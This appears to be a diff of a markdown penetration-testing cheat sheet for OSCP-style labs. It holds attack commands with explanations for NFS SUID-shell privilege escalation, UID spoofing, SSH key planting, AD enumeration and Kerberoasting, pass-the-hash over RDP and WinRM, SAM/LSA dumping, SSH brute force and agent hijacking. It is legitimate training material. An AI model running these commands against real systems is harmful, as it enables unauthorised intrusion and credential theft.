 Equivalent to `-e` but only prints the directory paths, useful for quick scripting/grepping when you don't need the ACL column.
-Source: [showmount(8) man page reference, cross-checked against HackTricks NFS enumeration flow](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)
 
 **13. Mount an NFS export locally**
 ```
@@ -679,7 +579,6 @@ mkdir /mnt/nfs-share
 mount -t nfs -o vers=3 <target-ip>:/<export-path> /mnt/nfs-share
 ```
 Forcing `vers=3` matters because NFSv3 is the version whose client-trusted UID/GID model enables the UID-spoofing attacks below; many targets still default to it. Add `,nolock` if `rpc.statd`/`nlockmgr` isn't reachable and mount hangs.
-Source: [Linux Privilege Escalation using Misconfigured NFS — Hacking Articles](https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/); [NFS Share no_root_squash — Juggernaut-Sec](https://juggernaut-sec.com/nfs-no_root_squash/)
 
 **14. Check for no_root_squash after mounting (SUID shell technique)**
 ```
@@ -688,7 +587,6 @@ cp /bin/bash /mnt/nfs-share/bash
 chmod +s /mnt/nfs-share/bash
 ```
 If the export is configured `no_root_squash`, files you create as local root retain root ownership on the server side; setting the SUID bit on a copied `bash` binary from the attacking box (where you are root) means executing that same file from a shell on the target (where the mount is also visible) runs as root, regardless of the invoking user's privileges there.
-Source: [NFS no_root_squash/no_all_squash misconfiguration PE — HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe); [NFS Share no_root_squash — Juggernaut-Sec](https://juggernaut-sec.com/nfs-no_root_squash/)
 
 **15. Beyond no_root_squash — UID-matching technique**
 ```
@@ -698,7 +596,6 @@ su shadowuser
 cp <ssh-pubkey-or-payload> /mnt/nfs-share/home/<target-user>/
 ```
 NFSv3 trusts the UID/GID the *client* advertises in its RPC calls rather than verifying it server-side. Creating a local attacker-box user whose UID numerically matches the target account (found via a leaked `/etc/passwd`, prior foothold, or `ls -la` ownership on the mount) lets you write/read files as that user even when `root_squash` is enforced and you are not root on the export.
-Source: [NFS no_root_squash/no_all_squash misconfiguration PE — HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe); [Escalating Privileges via NFS Misconfiguration — Medium/Orion](https://orion7715.medium.com/escalating-privileges-via-nfs-misconfiguration-6c15e6edd97c)
 
 **16. Beyond no_root_squash — SSH authorized_keys planting**
 ```
@@ -709,21 +606,18 @@ chown <matching-uid>:<matching-gid> /mnt/nfs-share/home/<target-user>/.ssh/autho
 ssh -i /tmp/nfskey <target-user>@<target-ip>
 ```
 Once you can write into the target user's home directory (via `no_root_squash` as root, or via the UID-matching trick above as that user's spoofed UID), dropping your own public key into `authorized_keys` gets you an interactive SSH session as that user without ever needing their password — often more useful than a one-shot SUID shell.
-Source: [Linux Privilege Escalation using Misconfigured NFS — Hacking Articles](https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/); [NFS no_root_squash/no_all_squash misconfiguration PE — HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)
 
 **17. Unmount cleanly**
 ```
 umount /mnt/nfs-share
 ```
 Standard cleanup step; leaving stale NFS mounts on the attack box can hang subsequent `showmount`/`mount` attempts against other hosts.
-Source: General NFS operational practice, cross-referenced with [NFS Share no_root_squash — Juggernaut-Sec](https://juggernaut-sec.com/nfs-no_root_squash/)
 
 **17b. Nmap NFS NSE sweep (companion/alternative to showmount)**
 ```
 nmap -p111,2049 --script nfs-showmount,nfs-ls,nfs-statfs <target-ip>
 ```
 `nfs-showmount` mirrors `showmount -e` (export list), `nfs-ls` recursively lists file contents of each export without mounting, and `nfs-statfs` reports filesystem usage/free space — all unauthenticated and useful when a mount isn't immediately available or you just need a fast read-only inventory.
-Source: [nfs-showmount NSE](https://nmap.org/nsedoc/scripts/nfs-showmount.html), [nfs-ls NSE](https://nmap.org/nsedoc/scripts/nfs-ls.html), [nfs-statfs NSE](https://nmap.org/nsedoc/scripts/nfs-statfs.html)
 
 ---
 
@@ -734,14 +628,12 @@ Source: [nfs-showmount NSE](https://nmap.org/nsedoc/scripts/nfs-showmount.html),
 ldapsearch -x -H ldap://<target-ip> -s base namingcontexts
 ```
 `-x` forces simple (non-SASL) auth for an unauthenticated bind, `-s base` restricts the search scope to the Root DSE itself (no credentials needed even against AD, which normally blocks anonymous binds everywhere *except* the Root DSE), and requesting the `namingcontexts` attribute returns the domain's base DN (e.g. `DC=corp,DC=local`) needed for every subsequent query.
-Source: [LDAP Anonymous Bind — Port 389 — Medium/Vinay A S](https://medium.com/@vinayas23913/ldap-anonymous-bind-9c023c6f9b04); [4. LDAP Anonymous Bind Check — Whoami/Osamaa](https://osamaa.gitbook.io/osama_homepage/cybersecurity-soc-analyst-labs/active-directory-attack-lab-recon-to-root/reconnaissance-phase/4.-ldap-anonymous-bind-check)
 
 **19. Full anonymous dump of the directory tree**
 ```
 ldapsearch -x -H ldap://<target-ip> -b "DC=corp,DC=local" > ldap_full_dump.txt
 ```
 With no filter supplied, this pulls every readable object under the base DN in one shot — the fastest way to see whether anonymous bind is fully open (common on standalone OpenLDAP boxes in labs) versus AD's typical Root-DSE-only exposure. Pipe to a file since output can be very large.
-Source: [htb_oscp_notes/ldap.md — islanddog](https://github.com/islanddog/htb_oscp_notes/blob/main/ldap.md); [Exploiting LDAP Server NULL Bind — n00py Blog](https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/)
 
 **Faster (nxc):** findings 20-27 below (users, groups, computers, password policy, Domain Admins/privileged users, delegation) can each be replaced with a single netexec flag once you have (or are testing) a credential:
 ```
@@ -753,42 +645,36 @@ nxc ldap <dc-ip> -u <user> -p <pass> --asreproast asrep_hashes.txt
 nxc ldap <dc-ip> -u <user> -p <pass> --kerberoasting kerb_hashes.txt
 ```
 Keep the manual `ldapsearch`/`windapsearch`/`ldapdomaindump` workflow below for when nxc isn't installed or you need a raw/custom filter.
-Source: [NetExec-Wiki — ldap-protocol](https://github.com/Pennyw0rth/NetExec-Wiki/tree/main/ldap-protocol)
 
 **20. Enumerate all user objects**
 ```
 ldapsearch -x -H ldap://<target-ip> -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description
 ```
 `(objectClass=user)` matches AD user (and computer, since computers inherit from user — filter further with `(&(objectClass=user)(objectCategory=person))` to exclude computer accounts) objects; requesting `sAMAccountName` and `description` keeps output to a scannable username list plus any notes admins left in the description field (a frequent password-hint leak).
-Source: [LDAP Enumeration Techniques: ldapsearch and windapsearch — Yunolay](https://yunolay.com/ldap-enumeration/); [LDAP Enumeration in Active Directory — Medium/Aditya Bhatt](https://medium.com/@adityabhatt3010/ldap-enumeration-in-active-directory-from-anonymous-bind-to-credentialed-recon-253261385b9d)
 
 **21. Enumerate group objects**
 ```
 ldapsearch -x -H ldap://<target-ip> -b "DC=corp,DC=local" "(objectClass=group)" cn member
 ```
 Returns every group's CN and its `member` DNs, letting you manually reconstruct membership of interesting groups (Domain Admins, Enterprise Admins) even before running BloodHound.
-Source: [LDAP Enumeration in Active Directory — Medium/Aditya Bhatt](https://medium.com/@adityabhatt3010/ldap-enumeration-in-active-directory-from-anonymous-bind-to-credentialed-recon-253261385b9d)
 
 **22. Enumerate computer objects**
 ```
 ldapsearch -x -H ldap://<target-ip> -b "DC=corp,DC=local" "(objectClass=computer)" cn dNSHostName operatingSystem
 ```
 Lists every domain-joined machine with its DNS hostname and OS version/build — useful for building a target list and spotting unpatched or EOL operating systems (e.g. Server 2008/2012) worth prioritizing.
-Source: [LDAP Enumeration Techniques: ldapsearch and windapsearch — Yunolay](https://yunolay.com/ldap-enumeration/); [LDAP | The Hacker Recipes (search-index summary)](https://www.thehacker.recipes/ad/recon/ldap)
 
 **23. Pull the domain password policy**
 ```
 ldapsearch -x -H ldap://<target-ip> -b "DC=corp,DC=local" "(objectClass=domain)" minPwdLength pwdHistoryLength lockoutThreshold lockoutDuration maxPwdAge minPwdAge pwdProperties
 ```
 Queries the domain-root object itself, whose `objectClass` is `domainDNS`/`domain`; the returned attributes give minimum password length, history depth, lockout threshold/duration, and max/min password age (stored as negative 100-nanosecond intervals — convert to days before relying on it) — essential for safely sizing a password-spray without locking accounts out.
-Source: [LDAP based password policy retrieval — NetExec GitHub Issue #868](https://github.com/Pennyw0rth/NetExec/issues/868); [Max-Pwd-Age Attribute — LDAPWiki](https://ldapwiki.com/wiki/Wiki.jsp?page=Max-Pwd-Age+Attribute); [Gathering Users & Password Policies — dollarboysushil OSCP/CPTS Notes](https://notes.dollarboysushil.com/active-directory-attacks/gathering-users-and-password-policies)
 
 **24. Anonymous enumeration with windapsearch (unauthenticated attempt)**
 ```
 python3 windapsearch.py -d corp.local --dc-ip <target-ip>
 ```
 Omitting `-u`/`-p` makes windapsearch attempt an anonymous bind before falling back to prompting; against a hardened AD DC this usually only returns Root-DSE-level metadata (same limitation as raw `ldapsearch`), but it's a fast way to confirm bind status and enumerate domain functional level before you have creds.
-Source: [windapsearch — ropnop, GitHub](https://github.com/ropnop/windapsearch)
 
 **25. windapsearch full user/group/computer enumeration (credentialed)**
 ```
@@ -797,7 +683,6 @@ python3 windapsearch.py -d corp.local -u 'corp\lowpriv' -p 'Password123' --dc-ip
 python3 windapsearch.py -d corp.local -u 'corp\lowpriv' -p 'Password123' --dc-ip <target-ip> -C -r
 ```
 `-U` lists all user objects, `-G` all groups, `-C` all computers with `-r` additionally resolving each computer's hostname to an IPv4 address via DNS — turning raw LDAP into an immediately actionable target/user list once even a single low-privilege credential is obtained (e.g. via ASREPRoast, a default cred, or a previous foothold).
-Source: [windapsearch — ropnop, GitHub](https://github.com/ropnop/windapsearch)
 
 **26. windapsearch privilege-focused modules**
 ```
@@ -806,42 +691,36 @@ python3 windapsearch.py -d corp.local -u 'corp\lowpriv' -p 'Password123' --dc-ip
 python3 windapsearch.py -d corp.local -u 'corp\lowpriv' -p 'Password123' --dc-ip <target-ip> --unconstrained-computers
 ```
 `--da` recursively lists effective Domain Admins members (following nested groups); `-PU`/`--privileged-users` recursively enumerates all users in any group with adminCount=1-style admin ACLs; `--unconstrained-computers` flags computer accounts trusted for unconstrained delegation — a direct pointer toward printer-bug/coercion-to-DA attack paths.
-Source: [windapsearch — ropnop, GitHub](https://github.com/ropnop/windapsearch)
 
 **27. windapsearch custom LDAP filter mode**
 ```
 python3 windapsearch.py -d corp.local -u 'corp\lowpriv' -p 'Password123' --dc-ip <target-ip> --custom "(&(objectCategory=user)(adminCount=1))"
 ```
 Passes any raw LDAP filter through, giving the full expressiveness of `ldapsearch` filters (e.g. `adminCount=1` to find protected/admin accounts) with windapsearch's cleaner formatted output.
-Source: [windapsearch — ropnop, GitHub](https://github.com/ropnop/windapsearch)
 
 **28. ldapdomaindump — anonymous attempt**
 ```
 ldapdomaindump -u '' <target-ip>
 ```
 Passing an empty username has ldapdomaindump attempt an unauthenticated bind; against most production AD DCs this fails (AD blocks anonymous simple binds beyond Root DSE by default) but is worth trying first and reliably works on misconfigured DCs and many standalone OpenLDAP lab targets.
-Source: [ldapdomaindump — dirkjanm, GitHub README](https://github.com/dirkjanm/ldapdomaindump)
 
 **29. ldapdomaindump — credentialed full domain dump**
 ```
 ldapdomaindump -u 'CORP\lowpriv' -p 'Password123' -o /tmp/ldapdump <target-ip>
 ```
 With any valid domain credential, this produces a full set of human-readable HTML pages (users, groups, computers, policy, trusts) plus JSON and greppable output in `/tmp/ldapdump` — the standard "first thing to run after getting one working credential" step before moving to BloodHound, since it needs no collector agent and works purely over LDAP.
-Source: [ldapdomaindump — dirkjanm, GitHub README](https://github.com/dirkjanm/ldapdomaindump)
 
 **30. ldapdomaindump — NTLM hash (pass-the-hash) auth and minimal/no-JSON output**
 ```
 ldapdomaindump -u 'CORP\lowpriv' -p 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' -o /tmp/ldapdump -r -n <dns-server-ip> <target-ip>
 ```
 `-p LM:NTLM` authenticates with a cracked/dumped NTLM hash instead of a cleartext password (no crack needed, `-at NTLM` is default); `-r` resolves computer hostnames via `-n <dns-server-ip>`, filling in IP addresses in the HTML computers report so it's immediately targetable.
-Source: [ldapdomaindump — dirkjanm, GitHub README](https://github.com/dirkjanm/ldapdomaindump)
 
 **31. LDAPS (LDAP over SSL, port 636) — encrypted anonymous bind**
 ```
 ldapsearch -x -H ldaps://<target-ip> -s base namingcontexts
 ```
 Same Root-DSE query as finding 18 but over TLS on 636 — test this whenever plaintext 389 is filtered/blocked but 636 is open (common on hardened DCs), or when the target enforces LDAP signing/channel binding and rejects unsigned plaintext queries.
-Source: [LDAP Anonymous Bind — Port 389 — Medium/Vinay A S](https://medium.com/@vinayas23913/ldap-anonymous-bind-9c023c6f9b04)
 
 **32. Global Catalog query (port 3268 / 3269 GC-over-SSL)**
 ```
@@ -849,7 +728,6 @@ ldapsearch -x -H ldap://<target-ip>:3268 -b "DC=corp,DC=local" "(sAMAccountName=
 ldapsearch -x -H ldaps://<target-ip>:3269 -b "DC=corp,DC=local" "(sAMAccountName=*)" sAMAccountName
 ```
 The Global Catalog (3268 plaintext, 3269 over SSL) exposes a forest-wide partial attribute set across *all* domains in a forest from a single query — useful in multi-domain environments where the base-DN queries above (finding 19-22) only see the local domain.
-Source: [Microsoft — Global Catalog and LDAP Searches](https://learn.microsoft.com/en-us/windows/win32/ad/global-catalog-and-ldap-searches)
 
 ---
 
@@ -867,15 +745,7 @@ Source: [Microsoft — Global Catalog and LDAP Searches](https://learn.microsoft
 
 ---
 
-## Notes on Research Constraints
-Several commonly cited primary sources (HackTricks `book.hacktricks.xyz`/`hacktricks.wiki`, Hacking Articles, web.archive.org, r.jina.ai) were unreachable from this environment (blocked at the outbound proxy/gateway level or returning 403 directly). Findings above were cross-verified using WebSearch result synthesis, GitHub raw-content fetches (which did succeed for `windapsearch` and `ldapdomaindump` READMEs and the `lanjelot/kb` rpcclient cheat sheet), and multiple independent secondary sources per finding where the primary source was inaccessible. All command syntax shown reflects the current stable tool interfaces as of research date (2026-08-02); flags for `windapsearch` and `ldapdomaindump` were confirmed directly against their GitHub READMEs.
----
-I'll now provide the structured markdown report directly, since this is a research task (not a file-authoring task the parent needs saved as an artifact). Findings below.
-
 ## RDP, WinRM, SSH — Manual Enumeration & Interaction
-
-## Topic
-Manual (non-Metasploit) enumeration and interactive-access commands for the three most common OSCP remote-access services — RDP (3389), WinRM (5985/5986), and SSH (22) — covering connection syntax, authentication edge cases (NLA/CredSSP, pass-the-hash), the `evil-winrm` and `netexec` (nxc, the CrackMapExec successor) tooling, and SSH banner grabbing / key-abuse patterns.
 
 ## Overview
 - **RDP**: `xfreerdp` (FreeRDP 3.x, the current Kali default; `rdesktop` is legacy/fallback) is used both to open full graphical sessions and to validate credentials headlessly (`+auth-only`). NLA/CredSSP is the default negotiated security layer on modern Windows and must be handled explicitly (accepted, downgraded, or used for pass-the-hash via Restricted Admin mode).
@@ -893,7 +763,6 @@ Manual (non-Metasploit) enumeration and interactive-access commands for the thre
 xfreerdp /u:<username> /p:'<password>' /d:<domain> /v:<target-ip> /cert:ignore
 ```
 Core auth flags: `/u:` username, `/p:` password, `/d:` domain, `/v:` target host/IP (optionally `host:port`). `/cert:ignore` skips the self-signed certificate prompt, which is the default on nearly all lab/OSCP targets.
-Source: https://linux.die.net/man/1/xfreerdp
 
 **2. Full interactive session with quality-of-life flags**
 ```
@@ -901,53 +770,45 @@ xfreerdp /u:<user> /p:'<pass>' /d:<domain> /v:<ip> /dynamic-resolution /cert:ign
   +clipboard +window-drag /compression /auto-reconnect /drive:mount,/home/kali/loot
 ```
 `/drive:share_name,/local/path` maps a local directory into the session for tool upload/exfil; `+clipboard` enables clipboard redirection; `/dynamic-resolution` resizes on window resize.
-Source: https://commandmasters.com/commands/xfreerdp-linux/, https://www.kali.org/tools/freerdp3/
 
 **3. Credential validation only (no GUI session)**
 ```
 xfreerdp /v:<ip> /u:<user> /p:'<pass>' +auth-only /cert:ignore
 ```
 Authenticates and exits (status 0 on success, "Authentication failure" on bad creds) without needing an X display — useful for quickly confirming discovered creds are valid for RDP, akin to what nxc does but via the real RDP auth path (catches permission issues nxc's SMB-based check would miss).
-Source: https://github.com/FreeRDP/FreeRDP/issues/2893, http://opentechnotes.blogspot.com/2015/02/compile-headless-freerdp-credential-checking.html
 
 **4. Console/admin session**
 ```
 xfreerdp /u:<user> /p:'<pass>' /v:<ip> /admin /cert:ignore
 ```
 `/admin` (or `+admin`) requests the console/admin session — relevant for older single-session admin scenarios and matching an already-logged-in admin's session.
-Source: https://hexmos.com/freedevtools/man-pages/user-commands/file-management/xfreerdp3/
 
 **5. Pass-the-hash via Restricted Admin mode**
 ```
 xfreerdp /v:<ip> /u:Administrator /d:<domain> /pth:<NTHASH> /cert:ignore +clipboard /dynamic-resolution
 ```
 `/pth:` takes the NT hash (32 hex chars) directly, bypassing the cleartext password — this is CredSSP-level pass-the-hash and only works if the target allows Restricted Admin mode (`HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin` = 0). Restricted Admin was introduced in RDP 8.1 specifically as a "no cleartext password over the wire" feature and initially shipped on by default, inadvertently enabling PtH — but Microsoft's July 8, 2014 security advisory (2973351/2975625) turned it **off** by default on Windows 8.1/Server 2012 R2 going forward (key typically absent, which means disabled). Don't assume PtH via RDP will "just work" against an unmodified 2012R2/8.1 box — it requires the DWORD to have been explicitly (mis)configured to 0 by an admin, or discovered already enabled via prior recon/foothold.
-Source: https://unclesp1d3r.github.io/posts/2023-02-16-pth-rdp/, https://labs.portcullis.co.uk/blog/new-restricted-admin-feature-of-rdp-8-1-allows-pass-the-hash/, https://support.microsoft.com/en-us/topic/microsoft-security-advisory-registry-update-to-improve-credentials-protection-and-management-for-windows-systems-that-do-not-have-the-2919355-update-installed-july-8-2014-165dab6e-2616-5b41-d0ba-747791489b7f
 
 **6. Explicit "Restricted Admin" login (no hash needed, if already privileged)**
 ```
 xfreerdp /restricted-admin /u:'<DOMAIN>\<user>' /p:'<pass>' /v:<ip>
 ```
 Forces restricted admin mode explicitly (server must support/allow it).
-Source: https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/lateral-movement/rdp
 
 **7. Legacy client: rdesktop**
 ```
 rdesktop -u <user> -p '<pass>' -d <domain> -g 1600x800 -r disk:share=/root/loot <ip>
 ```
 `-g` sets geometry (e.g. `85%` or `WxH`), `-r disk:sharename=/local/path` redirects a drive. Kept in the OSCP toolkit as a fallback when xfreerdp fails to negotiate against very old/broken RDP stacks.
-Source: https://www.kali.org/tools/rdesktop/, https://github.com/xapax/oscp/blob/master/templates/windows-template.md
 
 **8. NLA / CredSSP considerations**
 NLA (Network Level Authentication) forces authentication (NTLM or Kerberos, wrapped in CredSSP) to occur *before* a full RDP session/desktop is rendered, unlike classic RDP security which authenticates after the graphical handshake. This matters operationally: (a) NLA-protected hosts require valid creds up front, so unauthenticated screenshot/banner grabs won't get a login screen; (b) some legacy exploits (e.g. BlueKeep, `cve_2019_0708_bluekeep_rce`) fail outright against NLA-enabled targets since NLA blocks the pre-auth code path they rely on; (c) xfreerdp's `/sec:nla` forces NLA (default behavior against modern Windows), while `/sec:rdp` forces the older RDP security layer for hosts/tools that mishandle NLA negotiation.
-Source: https://www.pentestpartners.com/security-blog/abusing-rdps-remote-credential-guard-with-rubeus-ptt/, https://www.huntress.com/threat-library/vulnerabilities/cve-2019-0708
 
 **9. Unauthenticated NLA/OS fingerprinting via nmap**
 ```
 nmap -p 3389 --script rdp-ntlm-info,rdp-enum-encryption,rdp-vuln-ms12-020 -T4 <ip>
 ```
 `rdp-ntlm-info` sends an incomplete CredSSP/NTLM negotiation with null credentials; the server responds with an NTLMSSP message leaking NetBIOS name, DNS domain/hostname, and OS build — all without valid creds, and works precisely because CredSSP's initial handshake echoes this info before rejecting the empty auth.
-Source: https://nmap.org/nsedoc/scripts/rdp-ntlm-info.html, https://explainshell.com/explain?cmd=nmap+--script+%22rdp-enum-encryption+or+rdp-vuln-ms12-020+or+rdp-ntlm-info%22+-p+3389+-T4+10.10.10.27+-oX+nmap_RDP-enum
 
 **10. netexec RDP checks (fast triage before touching xfreerdp)**
 ```
@@ -957,7 +818,6 @@ nxc rdp <ip> -u <user> -p '<pass>' --local-auth
 nxc rdp <ip> -u <user> -p '<pass>' --screenshot --screentime 10
 ```
 `nxc rdp` alone (no creds) reports whether NLA is enabled/required against the target; `--screenshot` captures the login screen (works pre-auth when NLA is *disabled*).
-Source: https://gist.github.com/strikoder/99635df00444bbf5fc90ca83ec8051a0, https://www.netexec.wiki/rdp-protocol/screenshot-without-nla-not-connected
 
 ---
 
@@ -971,7 +831,6 @@ nxc winrm <ip> -u users.txt -p passwords.txt --local-auth
 nxc winrm <ip> -u <user> -p '<pass>' -d <domain>
 ```
 `--local-auth` targets a local (non-domain) account; `Pwn3d!` in the output indicates the account has admin-level WinRM access (able to execute code), not just an authenticated session.
-Source: https://gist.github.com/strikoder/99635df00444bbf5fc90ca83ec8051a0
 
 **12. netexec WinRM one-liner command execution**
 ```
@@ -979,42 +838,36 @@ nxc winrm <ip> -u <user> -p '<pass>' -x "whoami /all"
 nxc winrm <ip> -u <user> -p '<pass>' -X '$PSVersionTable'
 ```
 `-x` runs a cmd.exe command; `-X` runs a raw PowerShell command/expression — useful for quick verification before committing to a full evil-winrm session.
-Source: https://gist.github.com/strikoder/99635df00444bbf5fc90ca83ec8051a0
 
 **13. Basic evil-winrm session**
 ```
 evil-winrm -i <ip> -u <user> -p '<password>'
 ```
 `-i/--ip` (required), `-u/--user`, `-p/--password` (prompts if omitted). Default port 5985.
-Source: https://github.com/Hackplayers/evil-winrm
 
 **14. evil-winrm with local script/executable loading**
 ```
 evil-winrm -i <ip> -u <user> -p '<pass>' -s /home/kali/scripts/ -e /home/kali/exes/
 ```
 `-s/--scripts` points to a directory of `.ps1` files that become auto-tab-completable/loadable inside the shell (e.g. `PowerView.ps1`); `-e/--executables` similarly stages local `.exe`/binaries for the `menu`/upload workflow. Once connected, `menu` lists loaded functions (e.g. `Bypass-4MSI`, `Dll-Loader`, `Donut-Loader`).
-Source: https://github.com/Hackplayers/evil-winrm
 
 **15. evil-winrm pass-the-hash**
 ```
 evil-winrm -i <ip> -u <user> -H '<NTHASH>'
 ```
 `-H/--hash` authenticates with the NT hash instead of a password (works when WDigest/NTLM is permitted, no need to crack).
-Source: https://github.com/Hackplayers/evil-winrm
 
 **16. evil-winrm over SSL / custom port**
 ```
 evil-winrm -i <ip> -u <user> -p '<pass>' -S -P 5986 -c cert.pem -k key.pem
 ```
 `-S/--ssl` forces HTTPS; `-P/--port` overrides the default 5985; `-c/--pub-key` and `-k/--priv-key` supply a client certificate pair when the WinRM listener requires cert auth.
-Source: https://github.com/Hackplayers/evil-winrm
 
 **17. evil-winrm Kerberos auth**
 ```
 evil-winrm -i <hostname> -r <DOMAIN.COM> -K /path/ticket.ccache --spn HTTP
 ```
 `-r/--realm` sets the Kerberos realm (needs `/etc/krb5.conf` configured / `KRB5CCNAME` set appropriately); `-K/--ccache` loads a ccache/kirbi ticket obtained via Rubeus/impacket for pass-the-ticket into WinRM.
-Source: https://github.com/Hackplayers/evil-winrm
 
 **18. In-session file transfer (built-in evil-winrm commands)**
 ```
@@ -1022,14 +875,12 @@ upload /home/kali/tools/winPEAS.exe C:\Windows\Temp\winpeas.exe
 download C:\Users\victim\Desktop\flag.txt /home/kali/loot/flag.txt
 ```
 Both commands operate over the existing WinRM channel (PSRP-encoded base64 chunks) — no SMB/HTTP server needed.
-Source: https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/, https://github.com/Hackplayers/evil-winrm
 
 **19. In-session logging and quiet-of-life flags**
 ```
 evil-winrm -i <ip> -u <user> -p '<pass>' -l -n
 ```
 `-l/--log` writes the full session transcript to `$HOME` (important for OSCP proof-of-access documentation); `-n/--no-colors` for clean log output/piping.
-Source: https://github.com/Hackplayers/evil-winrm
 
 **20. netexec extra WinRM/SMB post-auth modules (used from the same nxc session)**
 ```
@@ -1038,7 +889,6 @@ nxc winrm <ip> -u <user> -p '<pass>' --lsa
 nxc smb <ip> -u <user> -p '<pass>' --local-auth --rid-brute
 ```
 `--sam`/`--lsa` dump local SAM/LSA secrets over the WinRM/WMI-backed exec chain when admin; `--rid-brute` enumerates local users via anonymous/low-priv RID cycling (SMB protocol, but standard pre-WinRM enumeration step for the same host).
-Source: https://gist.github.com/strikoder/99635df00444bbf5fc90ca83ec8051a0, https://www.netexec.wiki/smb-protocol/enumeration/enumerate-users-by-bruteforcing-rid
 
 ---
 
@@ -1051,7 +901,6 @@ nc -nv <ip> 22
 echo | timeout 2 nc -nv <ip> 22
 ```
 Immediately returns the SSH identification string (e.g. `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5`), which fingerprints OS distro/patch level for CVE lookup — no auth required, protocol sends the banner first.
-Source: https://en.wikipedia.org/wiki/Banner_grabbing
 
 **22. nmap full SSH enumeration sweep**
 ```
@@ -1061,7 +910,6 @@ nmap -Pn -sV -p 22 --script=banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods 
 - `ssh2-enum-algos` — lists every kex/cipher/MAC/compression algorithm offered (useful for spotting legacy/weak algo support indicating an old build).
 - `ssh-hostkey` — dumps host public key(s) + fingerprints (compare against known-weak-key databases, see #26).
 - `ssh-auth-methods` — enumerates which auth methods the server accepts (`publickey`, `password`, `keyboard-interactive`) for a given username, revealing whether password auth is even allowed.
-Source: https://nmap.org/nsedoc/scripts/ssh2-enum-algos.html, https://nmap.org/nsedoc/scripts/ssh-auth-methods.html, https://github.com/oncybersec/oscp-enumeration-cheat-sheet
 
 **23. Individual nmap NSE script usage**
 ```
@@ -1069,14 +917,12 @@ nmap --script ssh-hostkey -p 22 <ip>
 nmap --script ssh-auth-methods --script-args="ssh.user=<username>" -p 22 <ip>
 ```
 `ssh-auth-methods` needs a `ssh.user` script-arg to report per-user allowed methods (some servers vary by account, e.g. root disallowed for password).
-Source: https://nmap.org/nsedoc/scripts/ssh-auth-methods.html
 
 **24. Verbose interactive connection (algorithm/negotiation debugging)**
 ```
 ssh -vvv <user>@<ip>
 ```
 Triple-verbose shows full kex negotiation, offered host key types, and auth method attempts — useful when a target's SSH refuses modern clients (forces `-oKexAlgorithms=+diffie-hellman-group1-sha1` or `-oHostKeyAlgorithms=+ssh-rsa` style downgrades to connect to old CTF-style boxes).
-Source: general SSH client docs; corroborated by https://jumpnowtek.com/security/Enumerating-SSH-algorithms.html
 
 **25. Password brute force with Hydra**
 ```
@@ -1084,7 +930,6 @@ hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<ip>
 hydra -L users.txt -P passwords.txt -t 4 ssh://<ip>
 ```
 `-l/-L` single/list username, `-P` password wordlist, `-t` parallel connections (keep low against SSH — most daemons rate-limit/lock after failed attempts, `-t 4` is a safer OSCP default than the tool's default of 16).
-Source: https://brandonrussell.io/OSCP-Notes/My%20Hydra%20Cheatsheet.html, https://www.linuxfordevices.com/tutorials/linux/hydra-brute-force-ssh
 
 **26. Weak/predictable key detection — Debian OpenSSL PRNG bug (CVE-2008-0166)**
 ```
@@ -1093,7 +938,6 @@ git clone https://github.com/g0tmi1k/debian-ssh
 grep -r "<fingerprint-or-modulus>" debian-ssh/
 ```
 Debian/Ubuntu OpenSSL packages (Sept 2006–May 2008) had only ~32,767 possible seeds for key generation, making all RSA/DSA keys from that window enumerable. If a target's SSH host key or a user's key matches this known-weak-key set, the corresponding private key can be pulled straight from the pre-generated database — usable both to log in as a user whose `authorized_keys` uses a weak key, or to MITM/decrypt traffic to a host with a weak host key.
-Source: https://github.com/g0tmi1k/debian-ssh, https://www.debian.org/security/2008/dsa-1571, https://pentestmonkey.net/blog/metasploit-ssh-key-database
 
 **27. Deriving a public key from a found private key**
 ```
@@ -1102,7 +946,6 @@ ssh-keygen -y -f id_rsa > id_rsa.pub
 ssh-keygen -lf id_rsa      # print fingerprint for quick comparison
 ```
 When a private key is found (backup, git history, home directory, config file) but you need to confirm which account/host it unlocks, regenerate the public key and diff its fingerprint against entries in candidate `~/.ssh/authorized_keys` files or `ssh-keyscan` output.
-Source: https://x7331.gitbook.io/boxes/services/tcp/remote-access/22-ssh, https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/
 
 **28. Key reuse across hosts (lateral movement)**
 ```
@@ -1111,7 +954,6 @@ ssh -i id_rsa <user>@<other-host>
 cat ~/.ssh/known_hosts | cut -d' ' -f1 | tr ',' '\n'
 ```
 A private key recovered on one host is routinely tried against every other host listed in that user's `~/.ssh/known_hosts` (and against common usernames on sibling boxes in the same subnet) since key reuse across a fleet is common in exam/lab environments.
-Source: https://www.pentestpartners.com/security-blog/how-to-abuse-ssh-keys/
 
 **29. Fleet-wide host key fingerprinting with ssh-keyscan**
 ```
@@ -1119,7 +961,6 @@ ssh-keyscan -t rsa,ed25519 <ip1> <ip2> <ip3> > hostkeys.txt
 ssh-keyscan -t rsa <ip> | ssh-keygen -lf -
 ```
 `ssh-keyscan` grabs a host's public key(s) without authenticating; piping into `ssh-keygen -lf -` gets the fingerprint for comparing whether two "different" hosts actually share the same underlying SSH host key (common on cloned VM templates — a strong signal the whole fleet shares one image, and possibly one set of credentials/keys).
-Source: general OpenSSH `ssh-keyscan` manual usage; corroborated by https://github.com/kaio6fellipe/ssh-enum
 
 **29b. Edge case — SSH agent forwarding abuse**
 ```
@@ -1136,7 +977,6 @@ find /tmp -type s -name 'agent.*' 2>/dev/null
 SSH_AUTH_SOCK=/tmp/ssh-XXXXXXXXXX/agent.1234 ssh-add -l
 ```
